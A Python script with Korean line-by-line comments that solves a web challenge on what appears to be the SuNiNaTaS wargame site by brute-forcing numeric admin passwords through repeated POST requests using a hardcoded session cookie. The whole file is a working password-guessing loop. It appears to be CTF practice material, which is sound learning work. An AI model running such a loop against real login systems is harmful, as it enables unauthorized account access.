from http import client #http모듈에서 client class를 가져온다

conn = client.HTTPConnection('suninatas.com',80)
#suninatas.com:80에 연결된 소켓객체 conn 생성 (client class의 HTTPConnection() method를 이용함)

headers={'Content-Type': 'application/x-www-form-urlencoded',
         'Cookie': 'ASPSESSIONIDSSTABATC=HHEGOGOCKGKOOOONGOHLNIEK'}
url='/Part_one/web08/web08.asp'
#request할때 필요한 'packet header'와 'suninatas.com:80의 하위 url'을 정의한다

for i in range(0,9999):                    #i변수에 0~9999까지 차례대로 대입하며 루프한다
    body = 'id=admin&pw=%s'%i              #request할때 보낼 'parameter'를 정의한다
    print("pw=%s"%i)
    conn.request('POST',url,body,headers)  #소켓객체의 request() method를 사용해서 POST방식으로 앞에서 정의한 url,body,headers값을 전달
    res = conn.getresponse()               #소켓객체의 getresponse() method를 사용해서 '서버에서 보내준 응답값'을 res변수에 저장한다
    resData = res.read()                   #res변수값을 read() method 로 읽어서 resData변수에 저장
    strRes = str(resData)                  #resData변수를 str형으로 형변환시켜준다
    if(strRes.find("Incorrect!") == -1):   #strRes(문자열로 변환된 응답값)중에서 Incorrect!라는 문자열이 없다면 루프를 끝내는 조건을 넣음
        print("정답은 pw=%s"%i)
        break

conn.close()
